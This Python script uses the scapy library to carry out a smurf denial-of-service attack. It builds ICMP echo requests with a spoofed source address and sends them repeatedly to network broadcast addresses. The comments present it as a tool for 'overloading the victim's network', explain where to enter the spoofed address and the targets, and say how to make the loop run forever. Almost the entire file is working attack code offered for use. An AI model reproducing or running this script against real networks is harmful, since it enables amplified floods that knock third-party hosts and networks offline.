# Firstly, we are importing the scapy library to construct our packets.
from scapy.all import *
from scapy.layers.inet import ICMP, IP

# insert one or more broadcast addresses within your network.
IPS = []

# This input function will ask if the attack should start.
permission = input("Are you ready to start the attack? ")

loop = int(input("How many time do you want to loop the ICMP echo requests? "))
num = 1

# The boolean variable value will be the condition for our while loop.
value = True

# If the user wrote yes, the condition will be true.
if permission.upper() == "yes".upper():
    Value = True
# Otherwise the condition will be false.
else:
    Value = False

# The while loop will keep on looping through the function, overloading the victim's network.
while Value:

    # The packet_sending function creates the ICMP and IP packets, then sends them.
    def packet_sending(IPn):
        IP_pack = IP()
        # The 'src' is the source that is spoofed for the smurf attack.
        # You can enter the spoofed address within the single quotations.
        IP_pack.src = ''
        # 'dst' is the destination of the different hosts within the network.
        IP_pack.dst = IPn
        # The protocol '1' is the ICMP protocol for the IP packet.
        IP_pack.proto = 1

        icmp_pack = ICMP()
        icmp_pack.code = 0
        # The 'type' function of '8' is the ICMP echo request.
        icmp_pack.type = 8
        # It is optional to use the 'show' function to view all the details within each packet.
        icmp_pack.show()
        IP_pack.show()
        # The 'send' function will be used to send all the packet.
        send(IP_pack / icmp_pack)


    # This for loop will loop through all of our broadcast addresses.
    for IP_add in IPS:
        packet_sending(IP_add)

    # The if statement will be used to go through several iterations of the while loop.
    # if the condition is not met, it will break out of the while loop.
    # To make the program run infinitely, we can change the "+" sign with "-".
    if num < loop:
        num += 1

    else:
        break
